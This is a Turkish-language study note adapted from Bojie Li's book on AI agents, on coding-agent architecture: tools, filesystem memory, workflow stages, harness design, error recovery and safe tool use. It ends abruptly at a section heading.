# Coding agents

> **Kaynak ve uyarlama:** Bu not, Bojie Li’nin [AI Agents in Depth](https://github.com/bojieli/ai-agent-book) kitabından doğrudan alıntılar, çeviriler, özetler ve kişisel açıklamalar içerir. Kaynak içerik düzenlenmiş ve genişletilmiştir. [Kitaptaki ilgili bölüm](https://bojieli.github.io/ai-agent-book/book-en/chapter5/) · Lisans ve kaynak bilgileri: [README](../README.md#kaynak-ve-lisans).

---

bölümün ana tezi: genel amaçlı bir agent'ı güçlü kılan şey çok sayıda araca önceden sahip olması değil, gerektiğinde yeni yetenekler oluşturabilmesi, bunları çalıştırabilmesi ve sonuçları doğrulayabilmesidir.

bu yaklaşımla kodlama aslında sadece yazılım geliştirmeye özgü bir işlev değildir. matematiksel hesaplama, veri analizi, araştırma, belge üretimi, otomasyon ve iş akışı tasarımı gibi farklı görevleri tek bir yürütme altında birleştiren bir meta-yetenektir.

![Görsel](../gorseller/Pasted%20image%2020261010215034.png)

bu mimarinin iki tamamlayıcı bileşeni vardır:
* kodlama yeteneği: agent'ın yeni işlemler tanımlamasını, veri dönüştürmesini ve bunları yürütmesini sağlar
* dosya sistemi: agent'ın contextini, çalışma ürünlerini, kalıcı notlarını ve tekrar kullanılabilir bilgilerini saklar

bunları bir araya getiren üçüncü unsur ise kontrol döngüsüdür: agent planlar, act, sonucu observe, hataları giderir ve hedef karşılanana kadar süreci sürdürür. react -> reason + act

önemli ayrım şudur: bu mimari, her agent'ın mutlaka kod merkezli olması gerektiğini kanıtlamaz. daha çok görevleri açık uçlu ve çıktı biçimleri çeşitli olan genel amaçlı agent'larda kod yürütmenin neden güçlü bir çekirdek soyutlama olduğunu açıklar.

## 1. kodlama neden temel bir agent yeteneğidir? 

### 1.1 tool kullanmaktan tool üretmeye geçiş

klasik bir tool kullanan sistem, tasarım aşamasında kendisine tanımlanan işlemlerle sınırlıdır. yeni bir işlem gerektiğinde sisteme yeni bir tool, entegrasyon veya iş akışı eklenmesi gerekebilir.

kod üretebilen bir agent ise farklı bir yaklaşım benimser. elindeki temel işlemleri birleştirerek, belirli bir görev için ihtiyaç duyduğu mantığı kendisi oluşturabilir.

![Görsel](../gorseller/Pasted%20image%2020261010215502.png)

bu özelliğe meta-yetenek denmesinin nedeni budur: kodlama, yalnızca belirli bir işi gerçekleştirmekle kalmaz, başka işleri gerçekleştirecek mekanizmaların da oluşturulmasını mümkün kılar.

örneğin agent şu görevlerle karşılaşabilir: 
* bir veri dosyasındaki hatalı kayıtları bulup düzeltmek
* bir mat problemini çözücüye aktararak hesaplamak
* yeni bir dosya biçimini ayrıştırmak
* api yanıtlarını birleştirip rapor oluşturmak
* tekrarlanan workflowu yeniden kullanılabilir bir betiğe dönüştürmek

bu görevlerin alanları farklıdır; ancak hepsi ortak bir işlem modeline indirgenebilir: girdiyi al, mantığı tanımla, işlemi yürüt, sonucu denetle

### 1.2 kod, düşünme ve ifade etme ortamıdır

kodun avantajı yalnızca makine tarafından yürütülebilmesi değildir. aynı zamanda belirsizliği azaltması ve varsayımları açık hale getirmesidir. örneğin "18 yaşından büyük ve kimliği doğrulanmış kullanıcılar" ifadesini ele alalım. doğal dilde "ve" bağlacının kapsamı veya yaş sınırının dahil olup olmadığı yanlış anlaşılabilir. 

bu kural açık bir koşula dönüştürüldüğünde:

```python
eligible = age > 18 and identity_verified
```

mantıksal yapı belirginleşir. ancak burada önemli bir nüans vardır: kod belirsizliği kendinden çözmez. yukarıdaki ifade 18 yaşındaki bir kullanıcıyı dışlar. kural 18 yaşında veya daha büyük anlamına geliyorsa doğru ifade age >= 18 olmalıdır.

dolayısıyla kodun sağladığı kesinlik, doğru tanımlanmış varsayımlar ve doğru uygulanmış mantık için geçerlidir. hatalı gereksinim, kusursuz çalışan kodla da hatalı sonuç üretir.

kodun ikinci işlevi doğrulanabilirliktir. bir hesaplama betiği çalıştırılabilir, test edilebilir ve beklenen sonuçlarla karşılaştırılabilir. böylece yalnızca ikna edici görünen bir açıklamaya değil, belirli kontrollerden geçmiş bir sonuca dayanmak mümkün olur.

### 1.3 genel amaçlılık ile kapalı görev alanları arasındaki fark

kod merkezli mimarinni avantajı her senaryoda aynı ölçüde güçlü değildir.

|Boyut|Açık uçlu genel amaçlı Agent|Kapalı alan Agent'ı|
|---|---|---|
|Görev çeşitliliği|Yüksek; görevler önceden tam listelenemez|Daha sınırlı ve tanımlı|
|Tool gereksinimi|Görev sırasında değişebilir|Çoğunlukla önceden bilinir|
|Kodun rolü|Yetenek oluşturma ve yürütmenin merkezinde olabilir|Belirli işlemleri destekleyen bir tool olabilir|
|Temel mimari|Esnek yürütme, dosya sistemi ve orkestrasyon|İş kuralları, sabit iş akışları ve alan tool’ları|

bir araştırma ve üretim agent'ının yeni bir dosya biçimini işlemesi, veri analizi yapması ve bir rapor oluşturması gerekebilir. buna karşılık, belirli bir müşteri hizmetleri agent'ı sınırlı sayıdaki işlem ve politika etrafında tasarlanabilir.

sonuç: kodlama, genel amaçlı agent'larda güçlü bir mimari merkezdir, fakat her uzmanlaşmış agent'ın tüm mimarisini kod yürütme etrafında kurması gerekmez.

## 2. yedi temel tool: minimal ama genişletilebilir bir çalışma ortamı

bir kodlama agent'ının güçlü olması için başlangıçta onlarca özel araca sahip olması gerekmez. yedi temel tool, dosya tabanlı bir projede yapılabilecek işlemlerin büyük bölümünü karşılar.

![Görsel](../gorseller/Pasted%20image%2020261010220230.png)

bu liste bir ürünün değişmez tool standardı değildir. amaç, temel yetenekleri kavramsal olarak ayırmaktır. örneğin bash, dosya okuma, arama ve test çalıştırma işlemlerinin bir kısmını zaten yapabilir. bazı sistemler düzenleme işlemleri için ayrıca yapılandırılmış bir yama aracı kullanır. bazıları da kod yorumlayıcıyı bash'ten ayrı tutar. 

dolayısıyla yedi tool, yedi ayrı altyapının zorunlu olduğu anlamına gelmez. bunlar, dosya tabanlı bir agent'ın ihtiyaç duyduğu temel işlemleri açıklayan referans kümesidir.

## 2.1 tool’ların birleşimi neden önemlidir?

şu prompt girilirse -> "depodaki bütün TODO yorumlarını bul, listele ve bir dosyaya kaydet"

agent'ın işlemleri şu şekilde ilerleyebilir

![Görsel](../gorseller/Pasted%20image%2020261010221131.png)

bu görev için yedi aracın tamamına ihtiyaç yoktur. iki tool temel işi gerçekleştirebilir, doğrulama için ek bir okuma ve dosya kontrolü yapılabilir.

görev karmaşıklaştığında ise aynı tool’lar birleştirilebilir. Örneğin agent, TODO'ları önceliklerine göre sınıflandırıp modül başına sayılarını hesaplayabilir ve sonuçları grafikleştirebilir. burada kod yürütme, temel tool’ların üzerine yeni bir işlem mantığı ekler.

bu tasarımın esas avantajı tool sayısının azlığı değil, basit işlemlerin bileşiminden daha karmaşık işlevler üretilebilmesidir.

## 3. dosya sistemi: memory, bilgi ve yeteneklerin ortak zemini

kodlama agent'ının ikinci temel bileşeni dosya sistemidir. bu sistem, yalnızca dosyaların saklandığı bir yer değil, agent'ın görev boyunca ürettiği ve kullandığı bilginin kalıcılaştırılabildiği çalışma alanıdır. 

dosya sistemi üzerinden üç tür süreklilik sağlanabilir: 
* context sürekliliği: kullanıcının tercihleri, proje talimatları ve önceki kararlar
* işlemsel süreklilik: kodlar, geçici dosyalar, ara hesaplamalar ve üretilen çıktılar
* deneyim sürekliliği: önceki görevlerden öğrenilen ve ileride tekrar kullanılabilecek bilgiler

![Görsel](../gorseller/Pasted%20image%2020261010222925.png)

bu dosya adları, belirli bir mimaride kullanılabilecek örneklerdir; her agent sisteminde aynı adların veya düzenin bulunması gerekmez.

## 3.1 neden markdown?

markdown dosyaları, agent belleği ve talimatları için bazı pratik avantajlar sağlar

* doğrudan okunabilir: insan ve agent aynı içeriği inceleyebilir
* kolay düzenleme: yanlış veya güncelliğini yitirmiş bilgi, ilgili dosya değiştirilerek düzeltilebilir
* zamansal düzen: günlük kayıtlar tarih sırasına göre tutulabilir
* sürüm kontrolü: git ile değişiklikler izlenebilir ve geri alınabilir
* düşük altyapı maliyeti: basit dosya tabanlı memory için ayrı bir db zorunlu değil

ayrıca md her durumda vektör veritabanından veya yapılandırılmış depolamadan üstün değildir. çok büyük bilgi koleksiyonlarında, anlamsal aramada, ilişkisel sorgularda veya yüksek hacimli eşzamanlı erişimde başka sistemler daha uygun olabilir.

asıl tasarım ilkesi, belirli bir depolama teknolojisini evrensel olarak seçmek değil, belleği denetlenebilir, güncellenebilir ve gerektiğinde geri alınabilir hale getirmektir.

### 3.2 memory ile context aynı şey değil

bu ayrım context eng açısından kritiktir.

* memory, bilginin oturumlar arasında saklanabilmesini sağlar
* context, mevcut karar için modelin erişimine sunulan bilgidir

bir bilg idosyada bulunuyor diye modelin o bilgiyi otomatik kullandığı varsayılamaz, agent'ın ilgili dosyayı okuması, doğru bölümü bulması veya bilgiyi aktif context’e dahil etmesi gerekir.

bu nedenle etkili bir mimari yalnızca bilgi saklamaz, aynı zamanda doğru bilgiyi doğru zamanda call eder

aşırı miktarda bilginin contexte yüklenmesi avantajlı da değil.

## 4. genel amaçlı agent mimarisi: openclaw örneği

manus ve openclaw gibi sistemler üzerinden ele alınan mimari fikir, araştırma, computer use ve kod üretimini tek bir çalışma modelinde birleştirmektir. 

![Görsel](../gorseller/Pasted%20image%2020261010223458.png)

kodun çekirdek olarak konumlandırılmasının gerekçesi, bu yeteneklerin önemli bir bölümünün kodla desteklenebilmesidir.

örneğin,

* araştırma, web istekleri ve ayrıştırma betikleriyle desteklenebilir
* veri analizi, python gibi dillerle tekrarlanabilir hale getirilebilir
* pdf, html ve md raporları programatik olarak oluşturulabilir
* word ve pp dosyaları, uygun belge üretim kütüphaneleriyle hazırlanabilir
* tarayıcı işlemleri desteklenen durumlarda doğrudan api çağrıları veya tarayıcı otomasyon kodlarıyla gerçekleştirilebilir

burada kritik nüans şudur: her işlem kodla daha iyi yapılmaz. bazı web siteleri yalnızca gui sunabilir, bazı işlemler kullanıcı onayı gerektirebilir, bazı api'ler erişim veya kimlik doğrulama kısıtlarına sahip olabilir. dolayısıyla iyi bir agent, kodu varsayılan tek çözüm olarak değil, çoğu durumda güçlü ve ekonomik bir yürütme seçeneği olarak değerlendirmelidir.

### 4.1 örnek görev: satış verisinden rapor üretmek

kullanıcı şöyle bir istekte bulunsun

-> geçen çeyreğin satış verilerini analiz et, temel eğimileri belirle ve pdf rapor oluştur

![Görsel](../gorseller/Pasted%20image%2020261010223746.png)

Bu örnekte dosya sistemi üç farklı görevi bir araya getirir: başlangıç bilgisini sağlar, ara ürünleri saklar ve tamamlanan çıktıyı muhafaza eder.

Ayrıca Agent'ın her keşfini otomatik olarak kalıcı belleğe yazması gerekmez. Bir gözlemin güvenilir bir bilgiye veya tekrar kullanılabilir bir prosedüre dönüşmesi için doğrulanması, context’inin kaydedilmesi ve güncelliğinin değerlendirilmesi gerekir.

Bu ayrım, basit bir kayıt sistemini güvenilir bir öğrenme ve deneyim yönetimi mekanizmasından ayırır.

## 5. kodlama agent'ının uçtan uca workflowu

kodlama agent'ı yalnızca kod yazan bir sistem değildir. güvenilir bir engineering süreci, gereksinimlerin anlaşılmasından teslimat sonrasındaki dokümantasyon güncellemesine kadar uzanır.

![Görsel](../gorseller/Pasted%20image%2020261010223858.png)

Bu beş aşama katı bir tören değildir. Basit görevlerde birkaç aşama birleştirilebilir; yüksek riskli veya geniş kapsamlı değişikliklerde her aşamanın açıkça yürütülmesi daha önemlidir.

### 5.1. Aşama 1 — Projeyi tanıma ve dokümantasyon

Agent'ın ilk işi doğrudan kod değiştirmek olmamalıdır. Önce projenin yapısını anlamalıdır:

- README ve mimari dokümanları okumak.
    
- Dizin yapısını ve ana modülleri incelemek.
    
- Mevcut testleri ve çalıştırma komutlarını belirlemek.
    
- Bağımlılıkları, yapılandırmaları ve önemli kısıtları anlamak.
    

Kritik dokümantasyon eksikse, Agent kod tabanını inceleyerek başlangıç dokümanları hazırlayabilir.

Bu yaklaşımın arkasındaki ilke bilginin dışsallaştırılmasıdır: Sistem hakkındaki kritik bilgiler yalnızca insanların zihninde veya geçmiş konuşmalarda kalmamalı, erişilebilir belgelerde bulunmalıdır.

### 5.2. Proje talimat dosyaları

`AGENTS.md`, `CLAUDE.md` veya benzeri dosyalar, Agent'ın belirli bir projede nasıl çalışması gerektiğini tanımlayabilir.

Örnek içerikler:

- Doğru test ve derleme komutları.
    
- Kod biçimlendirme kuralları.
    
- Kullanılacak paket yöneticisi.
    
- Değiştirilmemesi gereken dizinler.
    
- Güvenlik ve mimari kısıtlar.
    

Bu dosyalar, insanlara yönelik README'lerden farklı olarak doğrudan Agent davranışını yönlendirmeyi hedefler.

Bununla birlikte, bu dosyaların otomatik olarak okunması veya context’e eklenmesi kullanılan araca ve yapılandırmaya bağlıdır. Dosyanın depoda bulunması tek başına yeterli değildir.

Context Engineering açısından bu dosyalar, görevler arasında görece sabit kalan talimatları merkezi bir yerde tutar. Bu, tekrarlanan talimatların her seferinde yeniden yazılması ihtiyacını azaltabilir ve desteklenen sistemlerde önbellekleme açısından da yararlı olabilir.

### 5.3. Aşama 2 — Gereksinimleri anlama

Her isteğin doğrudan kodlamaya dönüştürülmesi doğru değildir.

Örneğin “sistemi hızlandır” isteği, en az üç farklı hedefe işaret edebilir:

- Yanıt süresini azaltmak.
    
- Memory kullanımını düşürmek.
    
- Birim zamanda işlenen istek sayısını artırmak.
    

Bu hedefler bazen çatışır. Önbellekleme yanıt süresini düşürürken memory tüketimini artırabilir. Daha fazla paralellik verimi artırırken kaynak rekabetini büyütebilir.

Bu nedenle Agent, gerekli olduğunda kullanıcıya açıklayıcı sorular sormalı, mevcut durumu incelemeli ve başarı ölçütlerini tanımlamalıdır.

Temel kural: Belirsizliğin maliyeti yüksekse, erken kodlama yerine önce gereksinimi netleştirmek daha ekonomiktir.

### 5.4. Aşama 3 — Tasarım belgesi

Tasarım belgesi, gereksinim ile uygulama arasında bir köprü kurar.

İyi bir tasarım belgesi şu sorulara yanıt verir:

- Hangi dosyalar veya modüller değişecek?
    
- Neden bu yaklaşım seçildi?
    
- Alternatifler ve ödünleşimler neler?
    
- Yeni bağımlılıklar gerekiyor mu?
    
- Hangi testler değişikliği doğrulayacak?
    
- Geriye dönük uyumluluk veya güvenlik riski var mı?
    

Bu belgenin en önemli faydası, hatalı bir yaklaşımın yüzlerce satır koda dönüşmeden incelenebilmesidir.

Ancak her görev için tasarım belgesi zorunlu değildir. Küçük, açık ve düşük riskli bir düzeltme doğrudan uygulanabilir. Mimari etkisi büyük olan bir değişiklik ise insan incelemesi ve onayı gerektirebilir.


### 5.5. Aşama 4 — Kodlama, test ve kendi kendini düzeltme

Uygulama tamamlandığında Agent'ın görevi bitmiş sayılmaz.

![Görsel](../gorseller/Pasted%20image%2020261010224133.png)

Bu döngü, kod üreticisi ile mühendislik asistanı arasındaki önemli farklardan biridir.

Sadece kod yazan bir sistem, görünüşte doğru bir değişiklik sunabilir. Kodunu çalıştıran, test sonuçlarını inceleyen ve başarısızlık durumunda düzeltme yapan sistem ise iddialarını daha güçlü kanıtlarla destekleyebilir.

Bununla birlikte, testlerin geçmesi tüm hataların yok olduğu anlamına gelmez. Test kapsamı yetersiz olabilir; testler yanlış beklentileri doğrulayabilir veya üretim ortamındaki koşulları temsil etmeyebilir.

Dolayısıyla başarı ölçütü yalnızca “testler geçti” değil, uygun testlerin çalıştırılması, sonuçların incelenmesi ve kapsamın açıkça belirtilmesidir.

### 5.6. Aşama 5 — Kod incelemesi ve dokümantasyon senkronizasyonu

Testler başarılı olduktan sonra Agent şu konuları değerlendirmelidir:

- Kod okunabilir ve sürdürülebilir mi?
    
- Güvenlik açıkları veya beklenmeyen yan etkiler var mı?
    
- Gereksiz karmaşıklık eklendi mi?
    
- Performans sorunları ortaya çıktı mı?
    
- Mimari belgeler hâlâ doğru mu?
    

İnceleme sorun bulursa Agent değişiklik aşamasına geri dönmelidir.

Ayrıca yeni bir modül, bağımlılık veya temel soyutlama eklenmişse mimari dokümantasyon güncellenmelidir. Güncelliğini yitirmiş belgeler, gelecekteki geliştiricileri ve Agent'ları yanlış yönlendirebilir.

Bu iş akışının temel ilkesi şudur:

Planlama eylemden önce gelir; doğrulama eylem boyunca sürer; dokümantasyon sistemle birlikte evrilir.

## 6. Yeterli araştırma ile erken eylem arasındaki denge

Kodlama Agent'larının önemli bir karar problemi, ne zaman bilgi toplamayı bırakıp uygulamaya geçecekleridir.

Bir yaklaşım, değişiklik yapmadan önce çok sayıda dosyayı, bağımlılığı ve testi incelemektir. Bu yöntem geniş kapsamlı değişikliklerde faydalı olabilir; ancak küçük görevlerde gereksiz maliyet yaratır.

Diğer yaklaşım, en ilgili görünen dosyaları inceleyip erken bir değişiklik yapmak ve derleyici ya da test sonuçlarını araştırmanın parçası olarak kullanmaktır. Bu yöntem basit görevlerde hızlı olabilir; ancak geniş kapsamlı değişikliklerde önemli context’in gözden kaçmasına yol açabilir.

|Durum|Daha uygun yaklaşım|
|---|---|
|Küçük, açık ve düşük riskli hata|Hedefli inceleme ve hızlı test|
|Birden fazla modülü etkileyen değişiklik|Geniş kapsamlı kod ve bağımlılık incelemesi|
|Belirsiz performans problemi|Önce ölçüm ve darboğaz analizi|
|Güvenlik veya veri bütünlüğü riski|Daha sıkı inceleme, test ve onay|
|Yeni mimari veya büyük özellik|Tasarım belgesi ve aşamalı doğrulama|

Burada önemli olan, tek bir iş akışını her görevde aynen uygulamak değildir. Agent'ın inceleme derinliğini görevin belirsizliğine, kapsamına ve hata maliyetine göre ayarlamasıdır.

Ayrıca bu davranış yalnızca arayüz tasarımıyla açıklanamaz. Modelin eğitimi ve öğrenilmiş karar politikası, ne kadar araştırma yapacağına ve ne zaman eyleme geçeceğine etki edebilir. Tools, istemler, bütçeler ve çalışma ortamı bu davranışı güçlendirebilir veya sınırlayabilir.

Bu nedenle Agent değerlendirmelerinde iki ayrı soru sorulmalıdır:

1. Model ne yapmaya karar veriyor? Araştırma, planlama, tool seçimi ve durma politikası.
    
2. Sistem bu kararı nasıl destekliyor? Tools, talimatlar, yürütme ortamı ve doğrulama altyapısı.
    

Bu ayrım, model davranışı ile sistem mimarisini birbirine karıştırmadan analiz etmeyi sağlar.

## 7. Bütün mimarinin ortak ilkesi: Geri bildirimle ilerlemek

![Görsel](../gorseller/Pasted%20image%2020261010224541.png)

Bu bileşenler birbirinden bağımsız çalışmaz. Memory’deki bir proje talimatı kodlama kararını etkiler; kodun yürütülmesi yeni bilgi üretir; testler uygulamanın hatalarını gösterir; doğrulanmış deneyimler daha sonraki görevlerde kullanılabilir.

Ancak geri bildirimle ilerlemek, modelin kendiliğinden ve kalıcı biçimde yeniden eğitildiği anlamına gelmez. Dosyaya yeni bir not yazılması, bir programın değiştirilmesi ve model parametrelerinin güncellenmesi farklı mekanizmalardır.

Bu ayrım, sonraki aşamalarda ele alınan sürekli evrim yaklaşımının temelidir: Deneyimlerin kaydedilmesi, güvenilir bilgiye dönüştürülmesi ve yeniden kullanılabilir yetenekler hâline getirilmesi ayrı ayrı tasarlanmalıdır.

## 8. Kritik evaluation: Bu mimarinin sınırları

Kod merkezli genel amaçlı Agent mimarisi güçlü bir soyutlamadır; fakat tek başına güvenilirlik garantisi değildir.

|Risk|Neden önemlidir?|Tasarım karşılığı|
|---|---|---|
|Yanlış gereksinim|Kod doğru çalışsa bile yanlış hedefi karşılayabilir|Gereksinim netleştirme ve başarı ölçütleri|
|Hatalı kod|Üretilen mantık veya uygulama yanlış olabilir|Testler, inceleme ve yürütme doğrulaması|
|Güvenlik riski|Kod veya komutlar zararlı yan etkiler oluşturabilir|Yetki sınırları, izolasyon ve onay mekanizmaları|
|Eski memory|Geçmiş bilgiler artık geçerli olmayabilir|Kaynak, tarih, güven düzeyi ve güncelleme politikası|
|Eksik test kapsamı|Testlerin geçmesi gerçek dünyadaki tüm hataları dışlamaz|Sınır koşulları, entegrasyon testleri ve bağımsız kontroller|
|Aşırı tool kullanımı|Gereksiz işlemler maliyeti ve hata olasılığını artırır|Göreve uygun tool seçimi ve durma ölçütleri|

Bu tablo, mimarinin temel tasarım gerilimini gösterir: Agent'a daha fazla hareket alanı vermek, daha fazla yetenek sağlarken kontrol ihtiyacını da artırır.

Bu yüzden iyi bir sistem yalnızca “ne yapabilirim?” sorusuna değil, aynı zamanda “bunu hangi izinlerle yapabilirim?”, “sonucu nasıl doğrularım?” ve “hangi koşulda durmalıyım?” sorularına da yanıt vermelidir.

![Görsel](../gorseller/Pasted%20image%2020261010224653.png)

## Sonuç

Genel amaçlı bir Agent'ın mimarisini anlamanın en verimli yolu, onu yalnızca bir dil modeli veya tool koleksiyonu olarak görmemektir. Daha doğru yaklaşım, onu bilgiye erişen, kod üreten, işlemler gerçekleştiren, sonuçları doğrulayan ve deneyimini düzenleyen bir sistem olarak ele almaktır.

Bu çerçevede kodlama, açık uçlu görevlerde yeni yetenekler oluşturmayı sağlayan yürütme katmanıdır. Dosya sistemi ise bilgi ve iş ürünlerinin sürekliliğini sağlayan ortak çalışma alanıdır. Context Engineering, bu sistemin doğru bilgiyle çalışmasına yardımcı olurken tool tasarımı, kararların gerçek dünyadaki işlemlere dönüşmesini sağlar.

Nihai çıkarım: Genel amaçlı Agent'ların gücü yalnızca modelin zekâsından veya sahip olduğu tool sayısından doğmaz. Asıl güç; context, kod üretimi, yürütme, memory ve doğrulamanın tutarlı bir döngü içinde birleştirilmesinden gelir.

Bu mimari, Agent'ın sadece verilen tool’ları kullanan bir sistem olmaktan çıkıp, yeni görevler için çalışma mantığı üretebilen bir sisteme dönüşmesini açıklar. Bununla birlikte, güvenilirlik ancak uygun testler, sınırlandırılmış yetkiler, denetlenebilir memory ve göreve uygun doğrulama politikalarıyla sağlanabilir.

---

## Coding agent, yalnızca kod yazan bir model değildir.

bir llm kendisine verilen context’ten hareketle kod üretebilir. ancak gerçek bir yazılım geliştirme ortamında kod üretmek tek başına yeterli değildir. agent'ın projeyi anlaması, doğru dosyaları bulması, değişiklikleri uygulaması, testleri çalıştırması ve hata aldığında ne yapacağını belirlemesi gerekir. 

bu yüzden bir coding agent'ı yalnızca modelin yetenekleriyle değerlendirmek eksiktir. modelin çevresine kurulan tools, kontrol mekanizmaları ve çalışma döngüsü de en az model kadar önemlidir.

![Görsel](../gorseller/Pasted%20image%2020261012203821.png)

## 9.1 model, tools ve harness arasındaki fark

|Bileşen|Görevi|
|---|---|
|Model (LLM)|Akıl yürütür, kod önerir, sonraki eylemi seçer.|
|Tools (tools)|Dosya okuma, arama, terminal komutları ve test çalıştırma gibi işlemleri gerçekleştirir.|
|Harness|Modelin hangi tool’ları, hangi kurallarla ve hangi kontrol döngüsü içinde kullanacağını düzenleyen altyapıdır.|

harness, context yönetimi, tool calls, bug fix, yürütme sınırları ve doğrulama adımlarını kapsayabilir. bu nedenle daha güçlü bir model kullanmak her sorunu çözmez. zayıf bir harness, güçlü bir modeli bile verimsiz veya güvensiz hale getirebilir.

mühendislik çıkarımı: bir agent'ın başarısı yalnızca doğru cevabı üretmesine değil, doğru eylemleri gerçekleştirip gerçekleştirmediğine ve sonucunu kanıtlayabilmesine de bağlıdır.

## 10. harness engineering: modelin etrafındaki sistemi tasarlamak

harness eng, agent'ın çalışma ortamını ve kontrol mekanizmalarını tasarlama yaklaşımıdır. amaç yalnızca modele daha iyi talimatlar vermek değil, hataların ortaya çıkmasını zorlaştıran ve ortaya çıktıklarında etkilerini sınırlayan bir sistem kurmaktır.

örneğin bir android projesinde agent'dan yeni bir ekran eklemesini istediğimizi düşünelim. agent'ın yalnızca bir @Composable fonksiyonu üretmesi yeterli değildir. projedeki navigasyon yapısını, mevcut ui bileşenlerini, viewmodel sınırlarını ve derleme gereksinimlerini de anlaması gerekir.

![Görsel](../gorseller/Pasted%20image%2020261012204204.png)

## 10.1 neden iyi bir prompt yeterli değildir?

bir prompt, modele ne yapması gerektiğini söyler. fakat tek başına şunları garanti edemez:
* modelin doğru dosyayı bulmasını
* ürettiği kodun derlenmesini
* terminal komutunun başarıyla tamamlanmasını
* değişikliğin mevcut davranışı bozmamasını
* başarısız bir işlemden sonra güvenli biçimde devam edilmesini

bunlar yalnızca talimat değil, sistem tasarımı ve doğrulama gerektiren problemlerdir. 

## 11 hata kurtarma: agent başarısız olduğunda ne yapmalı?

coding agent'lar hata yaptığında iki kötü uç arasında kalabilir: aynı işlemi düşünmeden tekrar etmek veya ilk hatada tamamen durmak. iyi bir sistem, hatanın türüne göre farklı strateji seçer.

## 11.1 hata türlerini ayırmak

|Hata türü|Örnek|Uygun yaklaşım|
|---|---|---|
|Geçici hata|Ağ isteğinin zaman aşımına uğraması|Sınırlı sayıda yeniden deneme|
|Yanlış varsayım|Olmayan bir dosyayı düzenlemeye çalışma|Projeyi yeniden inceleme|
|Kod hatası|Derleme veya test başarısızlığı|Hata çıktısını analiz edip kodu düzeltme|
|Tool hatası|Komutun bulunamaması veya yanlış argüman|Komutu ve ortamı kontrol etme|
|Güvenlik riski|Yanlış dizinde yıkıcı komut çalıştırma ihtimali|İşlemi durdurma veya onay isteme|

buradaki temel ayrım şudur: her hata retry ile çözülmez. hata geçiciyse tekrar denemek yararlı olabilir, hatanın nedeni yanlış bir varsayımsa aynı işlem yalnızca zaman kaybettirir.

## 11.2 retry, feedback ve recovery

* retry: aynı işlemi genellikle sınırlı sayıda yeniden çalıştırmak
* feedback: hata mesajını veya test sonucunu modele sunarak sonraki kararını iyileştirmek
* recovery: başarısızlıktan sonra sistemin güvenli ve tutarlı bir duruma dönmesini sağlamak

bu üç mekanizma birbirinin yerine geçmez. örneğin bir testin başarısız olması, çoğu zaman yalnızca testi yeniden çalıştırmayı değil, test çıktısına göre kodu değiştirmeyi gerektirir. 

### Örnek: Derleme başarısız olduğunda

1. Agent değişikliği uygular ve Gradle derlemesini çalıştırır.
    
2. Derleme hatası oluşur; agent hata çıktısını alır.
    
3. Hatanın import, tür uyumsuzluğu, eksik bağımlılık veya yapılandırma kaynaklı olup olmadığını inceler.
    
4. İlgili kodu düzeltir ve derlemeyi yeniden çalıştırır.
    
5. Başarılı sonuç alınırsa doğrulama tamamlanır; tekrar başarısızsa agent yeni kanıta göre stratejisini değiştirir veya sınırına ulaşınca durur.

## 11.3 sonsuz döngüyü önlemek

agent aynı hatayı defalarca alabilir, bunu engellemek için harness şu sınırları koyabilir

* maksimum yeniden deneme sayısı
* işlem veya görev için zaman sınırı
* tool call ve token budget
* aynı hata tekrarlandığında strateji değiştirme koşulu
* güvenli biçimde durma ve kullanıcıya raporlama mekanizması

önemli bir tasarım ilkesi de idempotency kavramıdır: bir işlemin tekrarlanması, istenmeyen ek etkiler oluşturmamalıdır. dosya okuma genellikle güvenle tekrarlanabilirken, dosyaları silen veya dış sistemde kayıt oluşturan bir komut aynı özellikte olmayabilir.

## 12. coding agent geliştirirken uygulanabilecek mühendislik ilkeleri

agent tasarımında hedef, her adımda modele mümkün olduğunca çok özgürlük vermek değil. hedef, doğru işi yapmasını kolaylaştırırken hatalı eylemlerin maliyetini kontrol altında tutmaktır.

## 12.1 büyük bir değişikliği tek seferde yaptırmak yerinde, agent'ın işi küçük adımlara bölmesi daha kolay doğrulama sağlar

Örneğin bir Android özelliği geliştirilirken:

1. İlgili ekranı, ViewModel'i ve veri katmanını incele.
    
2. Değişiklik planını oluştur.
    
3. En küçük anlamlı kod değişikliğini uygula.
    
4. Derleme veya ilgili testi çalıştır.
    
5. Sonuca göre devam et ya da düzelt.

Bu yaklaşım, hata ortaya çıktığında sorunun hangi değişiklikten kaynaklandığını anlamayı kolaylaştırır.

### 12.2 Doğrulamayı isteğe bağlı bırakmamak

Agent'ın “kod tamamlandı” demesi, kodun doğru olduğunun kanıtı değildir. Doğrulama, çalışma akışının doğal bir parçası olmalıdır.

|Doğrulama düzeyi|Ne kontrol edilir?|
|---|---|
|Sözdizimi ve derleme|Kod teknik olarak derlenebiliyor mu?|
|Birim testleri|Fonksiyonlar ve sınıflar beklenen davranışı gösteriyor mu?|
|Entegrasyon testleri|Katmanlar ve servisler birlikte çalışıyor mu?|
|Uçtan uca testler|Kullanıcı akışı baştan sona tamamlanabiliyor mu?|
|Güvenlik ve yan etki kontrolleri|Yetkisiz veya istenmeyen değişiklik oluştu mu?|

Her görev tüm test seviyelerini gerektirmez. Önemli olan, değişikliğin riskine ve kapsamına uygun doğrulama seçmektir.

### 12.3 Güvenli tool kullanımı

Agent'ın terminale veya dosya sistemine erişebilmesi, her işlemi sınırsız biçimde yapması gerektiği anlamına gelmez.

İyi bir harness şu önlemleri uygulayabilir:

- Komutları kontrollü bir çalışma ortamında yürütmek.
    
- Dosya değişikliklerini Git diff üzerinden incelemek.
    
- Geri alınabilir değişiklikleri tercih etmek.
    
- Silme, yayınlama veya dış sistemlerde değişiklik yapma gibi yüksek riskli işlemleri sınırlamak.
    
- Gizli anahtarların ve kimlik bilgilerinin model context’ine gereksiz yere girmesini önlemek.
    
- Başarısızlık durumunda hangi değişikliklerin yapıldığını kaydetmek.


Temel ilke: Agent'ın eylem alanı genişledikçe, denetim ve kurtarma mekanizmalarının önemi de artar.

## 13. arama tool'ları: doğru context’i bulmak

Bir coding agent'ın başarısı, yalnızca kod yazma becerisine değil, hangi kodu incelemesi gerektiğini bulabilmesine de bağlıdır. Büyük bir projede bütün dosyaları modele vermek hem verimsizdir hem de context sınırlarına takılabilir.

Bu nedenle arama tool’ları, agent'ın context toplama mekanizmasının temel parçalarından biridir.

![Görsel](../gorseller/Pasted%20image%2020261012205645.png)

Bu yöntemler birbirini tamamlar. Anlamsal arama ilgili dosyaları keşfetmeye yardımcı olabilir; metin ve sembol araması ise belirli bir fonksiyonun veya kullanımın tam yerini bulmada daha doğrudan sonuç verebilir.

### 13.2 Arama stratejisi nasıl seçilir?

